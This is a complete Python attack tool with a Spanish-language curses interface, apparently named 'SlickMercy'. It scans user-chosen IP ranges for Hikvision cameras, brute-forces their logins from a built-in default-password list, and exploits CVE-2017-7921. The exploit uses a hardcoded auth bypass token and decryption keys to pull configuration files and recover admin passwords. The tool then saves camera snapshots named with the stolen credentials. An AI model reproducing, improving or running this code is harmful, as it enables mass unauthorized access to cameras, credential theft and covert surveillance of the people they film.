# -*- coding: utf-8 -*-
import os
import sys
import re
import socket
import threading
import asyncio
import aiohttp
import requests
import xml.etree.ElementTree as ET
import time
import curses
import ipaddress
from datetime import datetime
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor, as_completed
from Crypto.Cipher import AES

# Redirigir errores a log para mantener la interfaz limpia
sys.stderr = open('error.log', 'w')

# Diccionario global para compartir estados (escaneo y resultados de pruebas)
status_data = {"scanned": 0, "total": 0, "active_ips": 0, "weak_cams": 0, "cve_cams": 0}

##############################################
# Funciones para escanear y procesar IPs
##############################################
def scan_ips_cidr(cidr):
    try:
        network = ipaddress.ip_network(cidr, strict=False)
        return [str(ip) for ip in network.hosts()]
    except Exception:
        return []

def test_ip(ip, port=80):
    url = f"http://{ip}:{port}/doc/page/login.asp?"
    try:
        response = requests.get(url, timeout=1, headers={'User-Agent': 'Mozilla/5.0'})
        if response.status_code == 200:
            return True
    except Exception:
        pass
    return False

def find_active_ips_cidr(cidr, port=80, status_data=None):
    ips = scan_ips_cidr(cidr)
    if status_data is None:
        status_data = {}
    status_data["total"] = len(ips)
    status_data["scanned"] = 0
    status_data["active_ips"] = 0
    active_ips = []
    with ThreadPoolExecutor(max_workers=200) as executor:
        future_to_ip = {executor.submit(test_ip, ip, port): ip for ip in ips}
        for future in as_completed(future_to_ip):
            ip = future_to_ip[future]
            try:
                if future.result():
                    active_ips.append(ip)
                    status_data["active_ips"] += 1
                    with open("host.txt", "a+") as f:
                        existing = set(f.read().splitlines())
                        if ip not in existing:
                            f.write(f"{ip}\n")
            except Exception:
                pass
            status_data["scanned"] += 1
    return active_ips

##############################################
# Funciones para la prueba de Weak Password
##############################################
def get_ip_port(target: str, default_port=80):
    if ":" in target:
        parts = target.split(":")
        return parts[0], parts[1]
    else:
        return target, str(default_port)

def snapshot_hikvision(url: str, img_file_name: str, auth, timeout: int = 10):
    try:
        r = requests.get(url, auth=auth, timeout=timeout, verify=False,
                         headers={'Connection': 'close', 'User-Agent': 'Mozilla/5.0'})
        if r.status_code == 200 and "image/jpeg" in r.headers.get("Content-Type", ""):
            if not os.path.exists("pics"):
                os.makedirs("pics")
            with open(os.path.join("pics", img_file_name), "wb") as f:
                f.write(r.content)
            global status_data
            status_data["weak_cams"] += 1
            return True
        else:
            return False
    except Exception:
        return False

def test_target(target: str, user_list: list, pass_list: list, default_timeout: int = 10):
    ip, port_str = get_ip_port(target)
    port_val = int(port_str) if port_str.isdigit() else 80
    result = {"target": target, "vulnerable": False, "details": None}
    
    for user in user_list:
        for password in pass_list:
            try:
                url_check = f"http://{ip}:{port_val}/ISAPI/Security/userCheck"
                r = requests.get(url_check, auth=(user, password), timeout=default_timeout,
                                 verify=False, headers={'Connection': 'close', 'User-Agent': 'Mozilla/5.0'})
                if (r.status_code == 200 and 'userCheck' in r.text and 
                    'statusValue' in r.text and '200' in r.text):
                    result["vulnerable"] = True
                    result["details"] = f"{user}:{password}"
                    try:
                        url_channels = f"http://{ip}:{port_val}/ISAPI/Image/channels"
                        res = requests.get(url_channels, auth=(user, password),
                                           timeout=default_timeout, verify=False,
                                           headers={'Connection': 'close', 'User-Agent': 'Mozilla/5.0'})
                        channels_xml = ET.fromstring(res.text)
                        channels = len(channels_xml)
                    except Exception:
                        channels = 1
                    for channel in range(1, channels + 1):
                        url_snapshot = f"http://{ip}:{port_val}/ISAPI/Streaming/channels/{channel}01/picture"
                        img_file_name = f"{ip}-{port_val}-channel{channel}-{user}-{password}.jpg"
                        snapshot_hikvision(url_snapshot, img_file_name, auth=(user, password), timeout=default_timeout)
                    return result
            except Exception:
                continue
    return result

##############################################
# Funciones para la prueba de CVE-2017-7921 (asíncrona)
##############################################
def cycle_wrapper():
    return cycle(["|", "/", "-", "\\"])

async def config_decryptor(data):
    def add_to_16(s):
        while len(s) % 16 != 0:
            s += b'\0'
        return s

    def xore(data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):
        return bytes(a ^ b for a, b in zip(data, cycle(key)))

    def decrypt(ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):
        key = bytes.fromhex(hex_key)
        ciphertext = add_to_16(ciphertext)
        cipher = AES.new(key, AES.MODE_ECB)
        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
        return plaintext.rstrip(b"\0")

    def strings(file):
        chars = r"A-Za-z0-9/\-:.,_$%'()[\]<> "
        shortestReturnChar = 2
        regExp = '[%s]{%d,}' % (chars, shortestReturnChar)
        pattern = re.compile(regExp)
        return pattern.findall(file)

    xor = xore(decrypt(data))
    res = strings(xor.decode('ISO-8859-1'))
    idx = -res[::-1].index('admin')
    user, passwd = res[idx - 1], res[idx]
    return user, passwd

async def cve_2017_7921(ip: str) -> list:
    headers = {'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
    user_url = f"http://{ip}/Security/users?auth=YWRtaW46MTEK"
    config_url = f"http://{ip}/System/configurationFile?auth=YWRtaW46MTEK"
    snapshot_url = f"http://{ip}/onvif-http/snapshot?auth=YWRtaW46MTEK"
    timeout = 15

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(user_url, timeout=timeout, headers=headers) as r:
                if r.status == 200:
                    response_text = await r.text()
                    if 'userName' in response_text and 'priority' in response_text and 'userLevel' in response_text:
                        async with session.get(config_url, timeout=timeout * 2, headers=headers) as rc:
                            if rc.status == 200:
                                content = await rc.read()
                                user, passwd = await config_decryptor(content)
                                snapshot_name = f"{ip}_{user}_{passwd}.jpg"
                                async with session.get(snapshot_url, timeout=timeout, headers=headers) as rs:
                                    if rs.status == 200:
                                        snapshot_data = await rs.read()
                                        save_snapshot(snapshot_name, snapshot_data)
                                        global status_data
                                        status_data["cve_cams"] += 1
                                        return [True, 'Snapshot taken', user, passwd]
    except Exception:
        pass
    return [False]

def save_snapshot(filename, data):
    directory = 'VDB'
    if not os.path.exists(directory):
        os.makedirs(directory)
    file_path = os.path.join(directory, filename)
    with open(file_path, 'wb') as snapshot_file:
        snapshot_file.write(data)

##############################################
# Funciones para la Interfaz TUI (Blanco y Negro)
##############################################
def get_input(stdscr, prompt, y, x):
    # Desactiva temporalmente nodelay para entrada bloqueante
    stdscr.nodelay(False)
    curses.echo()
    stdscr.addstr(y, x, prompt)
    stdscr.refresh()
    input_str = stdscr.getstr(y, x + len(prompt)).decode('utf-8')
    curses.noecho()
    stdscr.nodelay(True)
    return input_str

def run_weak_test(active_ips):
    if os.path.exists("user.txt") and os.path.exists("pass.txt"):
        with open("user.txt", "r") as f:
            user_list = [line.strip() for line in f if line.strip()]
        with open("pass.txt", "r") as f:
            pass_list = [line.strip() for line in f if line.strip()]
    else:
        user_list = ["admin"]
        pass_list = ["12345", "admin12345", "Admin12345", "admin123", "Admin123", "Hik12345", "hik12345"]
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(test_target, ip, user_list, pass_list): ip for ip in active_ips}
        for _ in as_completed(futures):
            pass  # Los contadores se actualizan en status_data

def run_cve_test(active_ips):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    tasks = [cve_2017_7921(ip) for ip in active_ips]
    loop.run_until_complete(asyncio.gather(*tasks))

def main_curses(stdscr):
    global status_data
    status_data = {"scanned": 0, "total": 0, "active_ips": 0, "weak_cams": 0, "cve_cams": 0}
    curses.curs_set(0)
    stdscr.nodelay(True)  # Habilita entrada no bloqueante para animaciones

    # Cabecera en ASCII (Blanco y Negro)
    header = ["""
    
  ____  _ _      _    __  __
 / ___|| (_) ___| | _|  \/  | ___ _ __ ___ _   _
 \___ \| | |/ __| |/ / |\/| |/ _ \ '__/ __| | | |
  ___) | | | (__|   <| |  | |  __/ | | (__| |_| |
 |____/|_|_|\___|_|\_\_|  |_|\___|_|  \___|\__, |  
                                             /_/
                                              
    """]
    # Mostrar menú de opciones
    stdscr.clear()
    for i, line in enumerate(header):
        stdscr.addstr(i, 2, line, curses.A_BOLD)
    stdscr.addstr(8, 2, "Seleccione una opción:")
    stdscr.addstr(10, 4, "1. CVE")
    stdscr.addstr(11, 4, "2. Weak Password")
    stdscr.refresh()

    option = get_input(stdscr, "Opción: ", 13, 2).strip()
    cidr_range = get_input(stdscr, "Ingrese el rango CIDR (ej: 191.1.1.0/16): ", 15, 2).strip()
    port = "80"
    if option == "2":
        port = get_input(stdscr, "Ingrese el puerto: ", 17, 2).strip()

    # Inicia el escaneo en segundo plano
    active_ips = []
    scan_done = False
    def scan_ips_thread():
        nonlocal active_ips, scan_done
        active_ips = find_active_ips_cidr(cidr_range, int(port), status_data)
        scan_done = True

    scan_thread = threading.Thread(target=scan_ips_thread)
    scan_thread.start()

    spinner = cycle(["|", "/", "-", "\\"])
    # Bucle de actualización mientras se escanean las IPs
    while not scan_done:
        stdscr.erase()
        for i, line in enumerate(header):
            stdscr.addstr(i, 2, line, curses.A_BOLD)
        stdscr.addstr(8, 2, f"Escaneando IPs en {cidr_range}...")
        progress = f"IPs escaneadas: {status_data['scanned']}/{status_data['total']} | Activas: {status_data['active_ips']}"
        stdscr.addstr(10, 2, progress)
        stdscr.addstr(12, 2, f"Procesando {next(spinner)}")
        stdscr.addstr(14, 2, "Presione 'q' para salir.")
        stdscr.refresh()
        time.sleep(0.1)
        try:
            if stdscr.getch() == ord('q'):
                return
        except Exception:
            pass
    scan_thread.join()

    # Si no se encontraron IPs activas, notificar y salir
    if not active_ips:
        stdscr.erase()
        stdscr.addstr(8, 2, "No se encontraron IPs activas en el rango especificado.", curses.A_BOLD)
        stdscr.addstr(10, 2, "Presione cualquier tecla para salir.")
        stdscr.refresh()
        stdscr.nodelay(False)
        stdscr.getch()
        return

    # Para Weak Password se agrega el puerto a cada IP
    if option == "2":
        active_ips = [f"{ip}:{port}" for ip in active_ips]

    # Fase de prueba (CVE o Weak) en segundo plano
    test_done = False
    def test_phase():
        nonlocal test_done
        if option == "1":
            run_cve_test(active_ips)
        elif option == "2":
            run_weak_test(active_ips)
        test_done = True

    test_thread = threading.Thread(target=test_phase)
    test_thread.start()

    # Bucle de actualización mientras se ejecutan las pruebas
    while not test_done:
        stdscr.erase()
        for i, line in enumerate(header):
            stdscr.addstr(i, 2, line, curses.A_BOLD)
        phase_text = "Ejecutando prueba de CVE-2017-7921..." if option == "1" else "Ejecutando prueba de Weak Password..."
        stdscr.addstr(8, 2, phase_text)
        stdscr.addstr(10, 2, f"Cámaras obtenidas (CVE): {status_data['cve_cams']}")
        stdscr.addstr(11, 2, f"Cámaras obtenidas (Weak): {status_data['weak_cams']}")
        total_snap = status_data['cve_cams'] + status_data['weak_cams']
        stdscr.addstr(13, 2, f"Total snapshots: {total_snap}")
        stdscr.addstr(15, 2, f"Procesando {next(spinner)}")
        stdscr.addstr(17, 2, "Presione 'q' para salir.")
        stdscr.refresh()
        time.sleep(0.1)
        try:
            if stdscr.getch() == ord('q'):
                return
        except Exception:
            pass
    test_thread.join()

    # Pantalla final de resultados
    stdscr.erase()
    for i, line in enumerate(header):
        stdscr.addstr(i, 2, line, curses.A_BOLD)
    stdscr.addstr(8, 2, "Pruebas completadas.")
    stdscr.addstr(10, 2, f"IPs activas encontradas: {status_data['active_ips']}")
    stdscr.addstr(11, 2, f"Cámaras CVE: {status_data['cve_cams']}")
    stdscr.addstr(12, 2, f"Cámaras Weak: {status_data['weak_cams']}")
    total_snap = status_data['cve_cams'] + status_data['weak_cams']
    stdscr.addstr(14, 2, f"Total snapshots: {total_snap}")
    stdscr.addstr(16, 2, "Presione cualquier tecla para salir.")
    stdscr.nodelay(False)
    stdscr.refresh()
    stdscr.getch()

if __name__ == "__main__":
    try:
        curses.wrapper(main_curses)
    except Exception as e:
        print("Se produjo un error:", e)
    print("Presione Enter para salir...")
    input()
